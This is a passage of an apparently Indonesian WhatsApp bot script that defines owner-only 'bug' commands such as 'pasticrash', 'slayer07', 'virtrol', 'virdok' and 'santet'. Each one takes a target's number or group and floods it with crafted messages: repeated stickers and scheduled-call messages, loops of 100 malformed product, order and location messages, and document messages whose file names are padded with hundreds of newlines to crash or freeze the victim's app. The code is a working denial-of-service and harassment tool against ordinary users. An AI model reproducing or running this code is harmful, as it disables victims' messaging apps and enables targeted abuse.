await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'pasticrash':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan link Group')
Pe = qtext.split("|")[0]+'@g.us'
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzelitcees })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzelitcees })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
qio.sendMessage(Pe, { sticker : bugthumb }, { quoted:lanzbatosai })
await sleep(2000)
qio.relayMessage(Pe, { scheduledCallCreationMessage: { callType: "AUDIO", scheduledTimestampMs: 1200, title: global.doku2}},{ messageId: scheduledCallCreationMessage })
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'vpc':
if (!isCreator) return m.reply('lu bukan owner bro😁')
var messa = await prepareWAMessageMedia({ image: qioimage }, { upload: qio.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `KILL WHATSAPP 👽${paijoo}`,
"groupName": `KILL WHATSAPP 👽${buttonqio}`,
"caption": `Lanz BUG INVITE ${ngazap}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:lanzbatosai})
qio.relayMessage(`${dqtext}@s.whatsapp.net`, groupInvite.message, { messageId: groupInvite.key.id })
await m.reply('UDAH DI SEND YA BROK😋')
break

case 'slayer07':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply('Sedang Mengirim Ke Target😋')
jumlah = "100"
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: slayer }, { upload: qio.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `𝘚𝘭𝘢𝘺𝘦𝘳 07`,
"description": `𝘚𝘭𝘢𝘺𝘦𝘳 07`,
"jpegThumbnail": virgam,
"currencyCode": "IDR",
"footer": `𝘚𝘭𝘢𝘺𝘦𝘳 07`,
"priceAmount1000": "99999999999999",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `𝘚𝘭𝘢𝘺𝘦𝘳 07`,
"url": "wa.me/6283833387450"
},
"businessOwnerJid": "6283833387450@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lanzbatosai })
qio.relayMessage(Pe, catalog.message, { messageId: catalog.key.id })
}
break

case 'virlok':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply('Sedang Mengirim Ke Target😋')
jumlah = "100"
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: qioimage}, { upload: qio.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `https://perfect.`,
"jpegThumbnail": virgam,
}
}), { userJid: m.chat, quoted: lanzbatosai })
qio.relayMessage(Pe, location.message, { messageId: location.key.id })
}
break

case 'virtrol': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply('Sedang Mengirim Ke Target😋')
jumlah = "100"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `©𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐕𝐬 𝐒𝐥𝐞𝐛𝐞𝐰`,jpegThumbnail: qioimage}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐕𝐬 𝐒𝐥𝐞𝐛𝐞𝐰',
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6283833387450@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted : lanzbatosai})
qio.relayMessage(Pe, order.message, { messageId: order.key.id })
}
break

case 'virdok': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply('Sedang Mengirim Ke Target😋')
jumlah = "100"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐕𝐬 𝐒𝐥𝐞𝐛𝐞𝐰 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${doku2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` 𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐕𝐬 𝐒𝐥𝐞𝐛𝐞𝐰 ${doku2}`,
}

}), { userJid: m.chat, quoted: lanzbatosai})
qio.relayMessage(Pe, document.message, { messageId: document.key.id })
}
break

case 'darkness': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply('Sedang Mengirim Ke Target😋')
jumlah = "100"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Darkness 㐅️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${doku2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` Darkness 㐅 ${doku2}`,
}

}), { userJid: m.chat, quoted: lanzbatosai})
qio.relayMessage(Pe, document.message, { messageId: document.key.id })
}
break

case 'santet': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply('Sedang Mengirim Ke Target😋')
jumlah = "50"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔪👿💢🔪🖕😳😋😂😭👁️️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${doku2}.𝗕𝗔